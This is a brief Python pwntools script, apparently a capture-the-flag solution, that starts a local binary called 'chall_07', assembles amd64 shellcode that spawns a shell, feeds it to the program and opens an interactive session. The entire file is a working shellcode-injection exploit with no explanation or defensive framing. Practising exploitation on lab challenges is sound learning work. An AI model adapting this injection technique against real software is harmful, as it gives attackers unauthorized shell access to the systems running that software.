# coding: utf-8
from pwn import *
def chall07():
    p=process("./chall_07")
    context.arch="amd64"
    a=asm(shellcraft.sh())
    p.sendline(a)
    p.interactive()
    
chall07()
